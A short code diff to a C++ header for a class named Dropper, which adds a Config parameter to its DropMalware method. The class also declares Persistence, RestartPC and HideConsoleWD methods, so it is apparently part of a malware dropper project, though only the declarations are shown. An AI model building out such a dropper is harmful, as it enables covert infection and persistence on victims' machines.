@@ -13,7 +13,7 @@ class Dropper
 public:
 
 	void Init(Config config);
-	void DropMalware();
+	void DropMalware(Config config);
 	void Persistence();
 	void RestartPC();
 	void HideConsoleWD();
